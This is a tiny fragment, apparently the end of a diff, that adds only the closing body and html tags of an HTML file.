+  </body>
+</html>
